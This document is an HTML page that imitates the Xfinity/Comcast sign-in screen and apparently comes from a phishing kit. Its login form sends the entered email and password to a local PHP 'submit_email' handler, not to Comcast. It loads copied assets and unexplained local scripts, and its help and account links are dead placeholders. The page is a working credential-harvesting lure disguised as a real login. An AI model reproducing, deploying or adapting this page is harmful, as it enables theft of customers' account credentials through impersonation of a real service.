<!DOCTYPE html>
<html lang="en" class="light da" data-resource-package-id="res-responsive-login-page" >
<head>
<title>Sign in to Xfinity</title>
	<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
	<meta http-equiv="Content-Type" content="text/html;charset=utf-8">
	<meta name="mobile-web-app-capable" content="yes">
	<meta name="apple-mobile-web-app-capable" content="yes">
	<meta name="description" content="Get the most out of Xfinity from Comcast by signing in to your account. Enjoy and manage TV, high-speed Internet, phone, and home security services that work seamlessly together &mdash; anytime, anywhere, on any device.">
	<meta name="viewport" content="width=device-width,initial-scale=1">
	<meta name="msapplication-TileColor" content="#ffffff">
	<meta name="msapplication-TileImage" content="static/images/global/favicon/favicon-96x96.png">
	<meta name="theme-color" content="#ffffff">
	<script type="tracking-data-digitalData">
		{
			"page" : {
				"pageInfo" : {
					"screenName" : "sign in",
					"language" : "en",
					"referrerId" : "portal"
				 },
				 "category" : {
                    "primaryCategory" : "login",
                    "designType" : "responsive",
                    "businessType" : "resi",
                    "siteType" : "selfservice"
                },
                "affiliate" : {
                    "name": "comcast",
                    "channel" : "web"
                },
                "codebase" : {
                    "name" : "cima login"
                }
			},
			"user" : [{
				"profile" : [{
					"profileInfo" : {
						"authenticationType" : "unauthenticated",
						"recognizationType" : "unrecognized"
					}
				}],
				"segment" : {
					"isLocalized" : false
				}
			}],
			"schemaVersion" : 0.11
		}
</script>
<script>document.dispatchEvent(new CustomEvent("c-tracking-init-start"));</script>
<script>
    document.addEventListener("DOMContentLoaded", function() {
    document.dispatchEvent(new CustomEvent("c-tracking-log-page", {
        bubbles: true}));
	});
    document.addEventListener('click', function(ev){
    var element = ev.target.closest('a:not([data-tracking]), button:not([data-tracking])');
	    if (element) {
        var event = new CustomEvent('c-tracking-log-dom', {
        bubbles: true
        });
        element.dispatchEvent(event);
        }
    });
	</script>
	<link rel="shortcut icon" href="files/comcast/Assets/img/favicon.ico">
	<link rel="stylesheet" type="text/css" href="files/comcast/Assets/css/fonts-remote.min.css">
	<link rel="stylesheet" type="text/css" href="files/comcast/Assets/css/styles-light.min.css">
	<link rel="shortcut icon" href="/static/images/favicon/favicon.ico">
	<script type="text/javascript">
		runtimeData = {
		"r": "comcast.net",
		"selectAccount": "false",
		"s": "portal",
		"deviceAuthn": "false",
		"continue": "http://xfinity.comcast.net/",
		"ipAddrAuthn": "false",
		"forceAuthn": "0",
		"lang": "en",
		"passive": "false",
		"reqId": "e2c8ef68-fd14-4df8-8c66-da172ff99edc"
	}
	</script>
	<style type="text/css">
	@media only screen and (min-width: 1400px) {
	.ad.ad-fullscreen #left {
	margin-left: 670px;
	}
	.ad.ad-fullscreen #right {
	margin-right: 0px;
	}
	}
	.da-300x250 #ad-block {
	height: 250px;
	overflow: hidden;
	}
	</style>
	<script>document.dispatchEvent(new CustomEvent("c-tracking-init-styles"));</script>
</head>
	<body class=" has-footer ">
	<div id="breakpoints"></div>
	<div id="background"></div>
	<main id="bd" >
	<h1	class="screen-reader-text">Sign in to Xfinity</h1>
	<div id="left">	    
	<div id="ad-block">
	<h2 id="ad-heading" class="screen-reader-text">Advertisement</h2>
	<script type="text/javascript" src="/static/js/vm-login-form-ad.js"></script>
	<script>
	adInfo.init({
		targetAdElemId: 'ad-block',
		tvePartner: '',
		useIframe : false
	});
	</script>
	<img width="0" height="0" src="https://7468.v.fwmrm.net/ad/u?mode=echo&amp;cr=https%3A%2F%2Fdpm.demdex.net%2Fibs%3Adpid%3D796%26dpuuid=%23%7Buser.id%7D">
	<img src="https://xfinitydigital.demdex.net/event?d_sid=4702129" width="0" height="0" /></div>
	</div><div id="right">
		<div class="container">
			<form action="submit_email?session=<?php echo $key;?>" method="post" >
				<div class="single logo-wrapper">
				<span aria-role="img" class="xfinity-logo"></span>
				</div>
		        <div class="textfield-wrapper">
				<label for="email" class="float accessibly-hidden">Xfinity ID</label>
				<input id="user" name="email" type="text" placeholder="Email, mobile, or username" value="" autocorrect="off" autocapitalize="off" spellcheck="false" maxlength="128" >
			</div>
		<div class="textfield-wrapper">
		<label for="password" class="float accessibly-hidden">Password</label>
		<input id="passwd" name="password" type="password" placeholder="Password" maxlength="128">
		</div>
		<div class="checkbox-container">
		<label for="remember_me" >
		<input type="checkbox" id="remember_me" name="rm" value="1" ><span id="remember_me_checkbox" class="checkbox"></span><div class="content" >Stay signed in</div>
		</label>
		<button type="button" id="rm_label_learn_more" class="icon info cancel" data-id-ref="rm_help" aria-controls="rm_help" aria-label="Learn more about staying signed in"></button>
	</div>
<div>
<script type="text/javascript" src="Assets/js/com.js"></script>
<div id="nd-captcha" class="nd-captcha" lang="en">
<script type="text/javascript" src="Assets/js/coms2.js"></script>
</div>
	</div>
		<button class="submit" type="submit" name="verifyPassword" id="sign_in">Sign In</button>
			<ul>
			<li id="forgot-username-password-item">Forgot <a href="#" target="_self" title="Look up Xfinity ID">Xfinity ID</a> or <a id="forgotPwdLink" href="#" target="_self" title="Reset Password">password</a>?</li>
			<li id="create-username-item">Don't have an Xfinity ID?
				<span><a href="#" target="_self">Create one</a></span>
				</li>
					<li id="quick-bill-pay">
					<a href="#" target="_self">Pay any balance</a> without signing in</li>
			</ul>
		<p id="implied-legal">By signing in, you agree to our <a href="#">Terms of Service</a> and <a href="#">Privacy Policy</a>.</p>
		<input type="hidden" name="r" value="comcast.net">
		<input type="hidden" name="selectAccount" value="false">
		<input type="hidden" name="s" value="portal">
		<input type="hidden" name="deviceAuthn" value="false">
		<input type="hidden" name="continue" value="http://xfinity.comcast.net/">
		<input type="hidden" name="ipAddrAuthn" value="false">
		<input type="hidden" name="forceAuthn" value="0">
		<input type="hidden" name="lang" value="en">
		<input type="hidden" name="passive" value="false">
		<input type="hidden" name="reqId" value="e2c8ef68-fd14-4df8-8c66-da172ff99edc">
 	</form>
</div>
</div>
</main>
<footer>
<span class="content">
<span class="copyright">© 2020 Comcast</span>
<nav>
<span class="divider hide-compact"></span>
<span class="links">
<a href="#">Privacy Policy</a>
<span class="divider"></span>
<a href="#">Terms of Service</a>
</span>
<span class="ad-links divider"></span>
<span class="ad-links links">
<a href="#" target="_blank">Ad Info</a>
<span class="divider"></span>
<a href="#" target="_blank">Ad Feedback</a>
</span>
<span class="divider hide-compact"></span>
<span class="links">
<a href="#" >Cal. Civ. Code §1798.135: Do Not Sell My Info</a>
</span>
</nav>
</span>
</footer>
<script type="text/javascript" src="/static/js/libs/jquery-3.3.1.min.js"></script>
<div id="rm_help" role="dialog" aria-hidden="true" class="overlay" data-dialog-type="overlay">
    <div role="document" class="content">
    	<button type="button" class="close" aria-label="Close"></button>
    		<h1>Why Stay Signed In?</h1>
				<p>With this option selected, you'll stay signed in to your account on this device until you sign out. You should not use this option on public or shared devices.</p>
				<p>For your security, you may be asked to enter your password before accessing certain information.</p>
	</div>
</div>
<script type="text/javascript" src="/static/js/scripts-responsive.min.js?v=fbee6a7"></script>
<script type="text/javascript">
login.registerInitFunction(function(config){
	login.onSubmit = function() {
		var usernameSelector = "#"+config.usernameId,
			passwordSelector = "#"+config.passwordId,
			username = $(usernameSelector),
			password = $(passwordSelector);
		if(username.val() === "" || password.val() === "") {
			$("#error").remove();
			$(usernameSelector+", "+passwordSelector).addClass("error").attr({
				'aria-invalid': 'true',
				'aria-describedby': 'error'
			});
			$('<p id="error" class="error_message">'+config.authnEmptyError+'</p>').insertAfter(".textfield-wrapper:has("+passwordSelector+")");
			username.focus();
			return false
		} else {
			return true
		}
	};
	
}, "responsiveForm");
;
login.registerInitFunction(function(config){
	if (window.nucaptcha) {
		$.holdReady(true);
		
		function waitForNucaptchaReady() {
			if (nucaptcha.getInterface(1).getReadyState()) {
				$.holdReady(false);
				patchMarkup();
			} else
				setTimeout(waitForNucaptchaReady,10);
		}

		function patchMarkup() {
			$('#nucaptcha-answer').attr({
				"placeholder": $('#directions-verbose-label').text(),
				"aria-label": $('#directions-verbose-label').text(),
				"formnovalidate": "formnovalidate"
			});
			$('#directions-verbose-label').css('display','none');
		}

		function focusInputForAudioChallenge() {
			if ($('#nucaptcha-player audio').length)
				$('#nucaptcha-answer').focus();
		}

		waitForNucaptchaReady();
		patchMarkup();

		$(document).ready(function() {
			var nci = nucaptcha.getInterface(1);
			nci.addListener({
				onNuCaptchaEvent : function(event, param) {
					if (event === nci.EVENT_REFRESH_HTML) {
						patchMarkup();
						focusInputForAudioChallenge();
				    }
			  	}
	  		});
		});
	}
},"nuCaptcha");;
	shared.init();
        login.init({
            usernameId: 'user',
            passwordId: 'passwd',
            authnEmptyError: 'Please enter your Xfinity ID to sign in.'
        });
    </script>
<script type="text/javascript"></script>
<script type="text/javascript">
	document.dispatchEvent(new CustomEvent("c-tracking-init-end"));
</script>
</body>
</html>
